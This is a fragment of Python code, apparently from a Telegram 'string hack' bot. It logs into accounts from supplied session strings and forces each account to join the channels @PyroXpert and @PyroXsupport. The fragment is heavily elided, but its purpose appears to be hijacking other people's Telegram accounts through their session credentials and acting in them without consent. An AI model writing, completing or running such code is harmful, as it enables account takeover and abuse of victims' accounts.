...
from AIMXSTRINGHACK.Helpers.data import info
...
async def users_gc(session):
    ...
    try:
        if session.endswith("="):
            ...
            await steve.connect()                          
            try:
                await steve(join("@PyroXpert"))
                await steve(join("@PyroXsupport"))
            ...
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@PyroXpert")
                    await stark.join_chat("@PyroXsupport")
                except Exception as e:
                    print(e)    
